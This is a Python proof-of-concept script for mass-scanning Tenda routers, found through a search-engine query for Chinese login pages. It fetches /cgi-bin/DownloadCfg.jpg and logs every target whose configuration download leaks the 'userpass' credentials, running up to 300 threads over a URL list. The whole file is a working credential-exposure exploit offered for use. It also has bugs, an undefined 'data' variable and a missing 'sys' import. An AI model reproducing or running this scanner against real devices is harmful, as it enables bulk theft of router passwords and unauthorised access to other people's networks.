# title="Tenda | LOGIN" && country="CN"
import requests,argparse,time
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings() # 解除警告
GREEN = '\033[92m'
RESET = '\033[0m'
proxies = { 
       "http": "http://127.0.0.1:8080", 
       "https": "http://127.0.0.1:8080" 
       }
def banner():
	banner = """
     █████                      ██████   ██████
    ░░███                      ░░██████ ██████
     ░███        ██████   ██████░███░█████░███
     ░███       ░░░░░███ ███░░██░███░░███ ░███
     ░███        ███████░███ ░██░███ ░░░  ░███
     ░███      ████░░███░███ ░██░███      ░███
     ██████████░░███████░░███████████     █████
	"""
	print(banner)
def poc(target):
	payload_url = "/cgi-bin/DownloadCfg.jpg"
	url = target + payload_url
	headers={
		'Cache-Control': 'max-age=0',
		'Upgrade-Insecure-Requests': '1',
		'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
		'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
		'Accept-Encoding': 'gzip, deflate',
		'Accept-Language': 'zh-CN,zh;q=0.9',
		'Connection': 'close'
	}

	try:
		res = requests.get(url=target,verify=False)
		res1 = requests.get(url=url,headers=headers,data=data,verify=False)
		if res.status_code == 200:
			if res1.status_code == 200 and "userpass" in res1.text:
		
				print(f"{GREEN}[+]该url存在账号密码泄露：{target}{RESET}")
				with open("result.txt","a",encoding="utf-8") as f:
					f.write(target+"\n")
			else:
				print(f"[-]该url不存在账号密码泄露：{target}")
		else:
			print(f"该url连接失败：{target}")
	except:
		print(f"[*]该url出现错误：{target}")

def main():
	banner()
	parser = argparse.ArgumentParser()
	parser.add_argument("-u","--url",dest="url",type=str,help="please write link")
	parser.add_argument("-f","--file",dest="file",type=str,help="please write file\'path")
	args = parser.parse_args()
	if args.url and not args.file:
		poc(args.url)
	elif args.file and not args.url:
		url_list = []
		with open(args.file,"r",encoding="utf-8") as f:
			for i in f.readlines():
				url_list.append(i.strip().replace("\n",""))
		mp = Pool(300)
		mp.map(poc,url_list)
		mp.close()
		mp.join()
	else:
		print(f"\n\tUage:python {sys.argv[0]} -h")


if __name__ == "__main__":
	main()